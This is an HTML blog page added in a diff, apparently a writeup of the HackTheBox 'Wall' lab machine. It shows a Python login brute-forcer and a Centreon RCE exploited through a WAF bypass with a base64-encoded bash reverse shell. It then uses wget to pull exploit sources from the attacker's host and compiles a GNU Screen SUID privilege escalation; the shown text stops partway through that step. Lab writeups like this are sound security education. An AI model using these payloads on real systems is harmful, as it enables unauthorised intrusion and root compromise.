@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Wall | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/pure-min.css">
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="https://maggick.fr/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="https://maggick.fr/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="https://maggick.fr/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="https://maggick.fr/2020/12/htb-wall.html" title="Read more" class="entry-title-link">
+                HTB: Wall</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-12-07T17:45:00+01:00">07 Dec 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="https://maggick.fr/author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="https://maggick.fr/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="https://maggick.fr/tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="https://maggick.fr/tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="https://maggick.fr/tag/bruteforce.html" title="Read more with the label bruteforce" class="meta-link">bruteforce</a> 
+          <a href="https://maggick.fr/tag/centreon.html" title="Read more with the label centreon" class="meta-link">centreon</a> 
+          <a href="https://maggick.fr/tag/waf.html" title="Read more with the label WAF" class="meta-link">WAF</a> 
+          <a href="https://maggick.fr/tag/bypass.html" title="Read more with the label bypass" class="meta-link">bypass</a> 
+          <a href="https://maggick.fr/tag/suid.html" title="Read more with the label SUID" class="meta-link">SUID</a> 
+          <a href="https://maggick.fr/tag/screen.html" title="Read more with the label screen" class="meta-link">screen</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 8 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2019.12/wall_card.png" alt="Wall Card" width="262"></p>
+<p>This box is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/208">Wall</a>.
+This box is rated as a medium box. It implies a lot of frustration, some
+bruteforce, an centreon exploit with a WAF bypass and the exploitation of a SUID
+<code>screen</code>.</p>
+
+
+<div class="toc">
+<ul>
+<li><a href="#user">User</a><ul>
+<li><a href="#recon">Recon</a></li>
+<li><a href="#web">Web</a></li>
+</ul>
+</li>
+<li><a href="#getting-root">Getting root</a><ul>
+<li><a href="#reverse-shell">Reverse shell</a></li>
+</ul>
+</li>
+<li><a href="#wrapping-up">Wrapping up</a></li>
+</ul>
+</div>
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan the ports 22 (SSH) and 80 (HTTP)
+are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span># Nmap 7.80 scan initiated Thu Nov 28 07:17:03 2019 as: nmap -p- -oA nmap 10.10.10.157</span>
+<span class="code-line">Nmap scan report for 10.10.10.157</span>
+<span class="code-line">Host is up (0.085s latency).</span>
+<span class="code-line">Not shown: 65444 closed ports, 89 filtered ports</span>
+<span class="code-line">PORT   STATE SERVICE</span>
+<span class="code-line">22/tcp open  ssh</span>
+<span class="code-line">80/tcp open  http</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Thu Nov 28 07:30:05 2019 -- 1 IP address (1 host up) scanned in 782.66 seconds</span>
+</pre></div>
+
+
+<h2 id="web">Web</h2>
+<p>The home page is the default Apache page.</p>
+<p><img alt="Default apache page" src="/media/2019.12/wall_1.png"></p>
+<p>We run a dib against the site. Only one URL is found by the tool <code>/monitoring</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="c1">-----------------</span></span>
+<span class="code-line"><span class="n">DIRB</span> <span class="n">v2</span><span class="p">.</span><span class="mi">22</span></span>
+<span class="code-line"><span class="k">By</span> <span class="n">The</span> <span class="n">Dark</span> <span class="n">Raver</span></span>
+<span class="code-line"><span class="c1">-----------------</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">OUTPUT_FILE</span><span class="p">:</span> <span class="n">dirb</span></span>
+<span class="code-line"><span class="n">START_TIME</span><span class="p">:</span> <span class="n">Thu</span> <span class="n">Sep</span> <span class="mi">19</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">07</span> <span class="mi">2019</span></span>
+<span class="code-line"><span class="n">URL_BASE</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">157</span><span class="o">/</span></span>
+<span class="code-line"><span class="n">WORDLIST_FILES</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">txt</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">-----------------</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">GENERATED</span> <span class="n">WORDS</span><span class="p">:</span> <span class="mi">4612</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">---- Scanning URL: http://10.10.10.157/ ----</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">157</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">html</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">10918</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">157</span><span class="o">/</span><span class="n">monitoring</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">401</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">459</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">157</span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">403</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">300</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">-----------------</span></span>
+<span class="code-line"><span class="n">END_TIME</span><span class="p">:</span> <span class="n">Thu</span> <span class="n">Sep</span> <span class="mi">19</span> <span class="mi">11</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">07</span> <span class="mi">2019</span></span>
+<span class="code-line"><span class="n">DOWNLOADED</span><span class="p">:</span> <span class="mi">4612</span> <span class="o">-</span> <span class="k">FOUND</span><span class="p">:</span> <span class="mi">3</span></span>
+</pre></div>
+
+
+<p>The page is protected with a basic auth with the message "Protected area by the
+admin". We guess that the user is "admin".  We could try to bruteforce the
+password but that doesn't work.</p>
+<p>After some frustration, I sent some POST data to the page. Which result in a
+redirection to <code>/monitoring/</code> (notice the final <code>\</code>) and to a new URL.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>root@kalili:~# curl -d &#39;data=data&#39; -X POST http://10.10.10.157/monitoring</span>
+<span class="code-line"><span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;html&gt;&lt;head&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;title&gt;</span>301 Moved Permanently<span class="nt">&lt;/title&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;/head&gt;&lt;body&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;h1&gt;</span>Moved Permanently<span class="nt">&lt;/h1&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;p&gt;</span>The document has moved <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.157/monitoring/&quot;</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;hr&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;address&gt;</span>Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80<span class="nt">&lt;/address&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;/body&gt;&lt;/html&gt;</span></span>
+<span class="code-line">root@kalili:~# curl -d &#39;data=data&#39; -X POST http://10.10.10.157/monitoring/</span>
+<span class="code-line"><span class="nt">&lt;h1&gt;</span>This page is not ready yet !<span class="nt">&lt;/h1&gt;</span></span>
+<span class="code-line"><span class="nt">&lt;h2&gt;</span>We should redirect you to the required page !<span class="nt">&lt;/h2&gt;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content=</span><span class="s">&quot;0; URL=&#39;/centreon&#39;&quot;</span> <span class="nt">/&gt;</span></span>
+</pre></div>
+
+
+<p>We go to the <code>/centreon</code> URL. This is another authentication form.</p>
+<p><img alt="Centreon authentication" src="/media/2019.12/wall_2.png"></p>
+<p>We can guess that the user is admin. We load the 50 first enrties of rockyou
+(<code>head -n 50 rockyou.txt &gt; rockyou_50.txt</code>).</p>
+<p><em>Disclaimer: Bruteforce attacks are pretty uncommon on HTB. I asked on the
+Discord if this was the right track before bruteforcing as it might distrupt the
+box for other users.</em></p>
+<p>When looking at the requests we can see that there is an token to protect the
+application against brute force. We wrote a simple python script to make a first
+request, get the token and send a authentication requests.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">import</span> <span class="nn">requests</span></span>
+<span class="code-line"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://10.10.10.157/centreon/index.php&quot;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">testPassword</span><span class="p">(</span><span class="n">password</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span></span>
+<span class="code-line">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">token</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;value&#39;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;useralias&#39;</span><span class="p">:</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s1">&#39;submitLogin&#39;</span><span class="p">:</span><span class="s1">&#39;Connect&#39;</span><span class="p">,</span> <span class="s1">&#39;centreon_token&#39;</span><span class="p">:</span><span class="n">token</span><span class="p">})</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;Your credentials are incorrect.&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">):</span></span>
+<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;rockyou_50.txt&quot;</span><span class="p">)</span></span>
+<span class="code-line"><span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">file</span><span class="p">:</span></span>
+<span class="code-line">    <span class="n">testPassword</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span></span>
+</pre></div>
+
+
+<p>We launch the script and get the password: <code>password1</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="err">python3 bruteforce.py</span></span>
+<span class="code-line"><span class="err">password1</span></span>
+</pre></div>
+
+
+<p>We can login in the centron interface.</p>
+<p><img alt="Centreon interface" src="/media/2019.12/wall_3.png"></p>
+<p>We search for the available exploits on this solution. Most of the know exploit
+are old but the one concerning Centreon 19.04.</p>
+<div class="highlight"><pre><span class="code-line"><span></span># searchsploit centreon</span>
+<span class="code-line">--------------------------------------- ----------------------------------------</span>
+<span class="code-line"> Exploit Title                         |  Path</span>
+<span class="code-line">                                       | (/usr/share/exploitdb/)</span>
+<span class="code-line">--------------------------------------- ----------------------------------------</span>
+<span class="code-line">Centreon - SQL Injection / Command Inj | exploits/unix/remote/35078.rb</span>
+<span class="code-line">Centreon 1.4.2.3 - &#39;get_image.php&#39; Rem | exploits/php/webapps/5204.py</span>
+<span class="code-line">Centreon 1.4.2.3 - &#39;index.php&#39; Local F | exploits/php/webapps/31318.txt</span>
+<span class="code-line">Centreon 19.04  - Remote Code Executio | exploits/php/webapps/47069.py</span>
+<span class="code-line">Centreon 2.3.1 - &#39;command_name&#39; Remote | exploits/php/webapps/36293.txt</span>
+<span class="code-line">Centreon 2.5.3 - Remote Command Execut | exploits/php/webapps/39501.txt</span>
+<span class="code-line">Centreon 2.5.3 - Web Useralias Command | exploits/python/remote/40170.rb</span>
+<span class="code-line">Centreon 2.5.4 - Multiple Vulnerabilit | exploits/php/webapps/37528.txt</span>
+<span class="code-line">Centreon 2.6.1 - Multiple Vulnerabilit | exploits/php/webapps/38339.txt</span>
+<span class="code-line">Centreon &lt; 2.5.1 / Centreon Enterprise | exploits/linux/webapps/41676.rb</span>
+<span class="code-line">Centreon Enterprise Server 2.3.3 &lt; 2.3 | exploits/php/webapps/23362.py</span>
+<span class="code-line">Centreon IT &amp; Network Monitoring 2.1.5 | exploits/php/webapps/11979.pl</span>
+<span class="code-line">Oreon 1.4 / Centreon 1.4.1 - Multiple  | exploits/php/webapps/4735.txt</span>
+<span class="code-line">--------------------------------------- ----------------------------------------</span>
+<span class="code-line">Shellcodes: No Result</span>
+<span class="code-line">Papers: No Result</span>
+</pre></div>
+
+
+<p>A quick Google research let us find
+<a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">an article about the vulnerability</a>
+(The domain was not renew and the article is no more available)</p>
+<p>If we directly use the exploit, we will see that our  payload is blocked with a
+403 error. There is a WAF allow only some characters A little digging allow use
+to find the allowed and blocked one. The spaces are blocked, the <code>#</code> is blocked
+but the <code>()</code> and the <code>$</code> and the <code>|</code> are allowed. We can use encode our payload
+using <code>base64</code> in order to execute a payload with encoded characters.</p>
+<p>In order to replace the spaces in our payload we must use <code>${IFS}</code>
+<a href="https://bash.cyberciti.biz/guide/$IFS">variable</a></p>
+<p>We want to use the default <code>bash</code> reverse shell:
+<code>bash -i &gt;&amp; /dev/tcp/10.10.14.184/4444 0&gt;&amp;1</code></p>
+<p>We want to pipe it to <code>base64 -d</code> and pipe the result to bash. Then we need to
+discard the rest of the command (as the argument will not be valid). As the <code>#</code>
+character is blocked, we can use a <code>;</code>. Our command will be executed and then
+the rest will failed with an error, but we do not care as our command will be
+executed first.</p>
+<p>Our final payload is <code>echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODQvNDQ0NCAwPiYx|base64${IFS}-d|bash${IFS}-;</code></p>
+<p>As the script is not reliable we do it manually directly in the interface. We
+access the poller interface.</p>
+<p><img alt="Configuring the poller" src="/media/2019.12/wall_4.png"></p>
+<p>We add a new poller with our command. We need to specify that it target
+localhost.</p>
+<p><img alt="adding the puller" src="/media/2019.12/wall_5.png"></p>
+<p>Then we export its configuration (while have a <code>netcat</code> listener running).</p>
+<h1 id="getting-root">Getting root</h1>
+<p><em>On this box, we do not need to get user before getting root. We will grab the
+user flag once we are root.</em></p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>We got a reverse shell, we start enumerating the box. While searching for SUID
+file we found a SUID <code>screen</code> binary.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="err">find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</span></span>
+</pre></div>
+
+
+<p>Our <a href="https://gtfobins.github.io/gtfobins/screen/">gtfobins</a> friend do nottell us that
+there is privilege escalation with an SUID screen.</p>
+<p>But when search it with <code>searchsploit</code> we find an interesting exploit for the
+specific <code>screen</code> version on the box.
+(the <code>sh</code> script is a POC using the exploit described in the <code>txt</code>).</p>
+<div class="highlight"><pre><span class="code-line"><span></span>searchsploit screen 4.5.0</span>
+<span class="code-line">-------------------------------------------- ----------------------------------------</span>
+<span class="code-line">Exploit Title                              |  Path</span>
+<span class="code-line">                                            | (/usr/share/exploitdb/)</span>
+<span class="code-line">-------------------------------------------- ----------------------------------------</span>
+<span class="code-line">GNU Screen 4.5.0 - Local Privilege Escalati | exploits/linux/local/41152.txt</span>
+<span class="code-line">GNU Screen 4.5.0 - Local Privilege Escalati | exploits/linux/local/41154.sh</span>
+<span class="code-line">-------------------------------------------- ----------------------------------------</span>
+<span class="code-line">Shellcodes: No Result</span>
+<span class="code-line">Papers: No Result</span>
+</pre></div>
+
+
+<p>First of all we get a better reverse shell with python <code>python -c 'import pty; pty.spawn("/bin/sh")'</code>
+Then we follow the commands in the <code>sh</code> script while changing the path from
+<code>/tmp/</code> to <code>/tmp/ioio/</code>. Also we <code>wget</code> the <code>libhax.c</code> and <code>rootshell.c</code> which
+we edited on our local system.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">centreon</span><span class="o">/</span><span class="n">www</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="w"></span></span>
+<span class="code-line"><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="n">wget</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.169</span><span class="err">:</span><span class="mi">8081</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="n">wget</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.169</span><span class="err">:</span><span class="mi">8081</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="n">wget</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.169</span><span class="err">:</span><span class="mi">8081</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="n">wget</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.169</span><span class="err">:</span><span class="mi">8081</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"></span></span>
+<span class="code-line"><span class="n">ls</span><span class="w"></span></span>
+<span class="code-line"><span class="n">libhax</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="n">rootshell</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="err">$</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">fPIC</span><span class="w"> </span><span class="o">-</span><span class="n">shared</span><span class="w"> </span><span class="o">-</span><span class="n">ldl</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="n">ared</span><span class="w"> </span><span class="o">-</span><span class="n">ldl</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="w"> </span><span class="ow">In</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;dropshell&#39;</span><span class="err">:</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">libhax</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">7</span><span class="err">:</span><span class="mi">5</span><span class="err">:</span><span class="w"> </span><span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="n">implicit</span><span class="w"> </span><span class="n">declaration</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;chmod&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">mean</span><span class="w"> </span><span class="s1">&#39;chroot&#39;</span><span class="vm">?</span><span class="w"> </span><span class="o">[</span><span class="n">-Wimplicit-function-declaration</span><span class="o">]</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">chmod</span><span class="p">(</span><span class="ss">&quot;/tmp/ioio/rootshell&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">04755</span><span class="p">);</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="o">^~~~~</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">chroot</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="err">$</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="w"> </span><span class="ow">In</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;main&#39;</span><span class="err">:</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3</span><span class="err">:</span><span class="mi">5</span><span class="err">:</span><span class="w"> </span><span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="n">implicit</span><span class="w"> </span><span class="n">declaration</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;setuid&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">mean</span><span class="w"> </span><span class="s1">&#39;setbuf&#39;</span><span class="vm">?</span><span class="w"> </span><span class="o">[</span><span class="n">-Wimplicit-function-declaration</span><span class="o">]</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="o">^~~~~~</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">setbuf</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">4</span><span class="err">:</span><span class="mi">5</span><span class="err">:</span><span class="w"> </span><span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="n">implicit</span><span class="w"> </span><span class="n">declaration</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;setgid&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">mean</span><span class="w"> </span><span class="s1">&#39;setbuf&#39;</span><span class="vm">?</span><span class="w"> </span><span class="o">[</span><span class="n">-Wimplicit-function-declaration</span><span class="o">]</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="o">^~~~~~</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">setbuf</span><span class="w"></span></span>
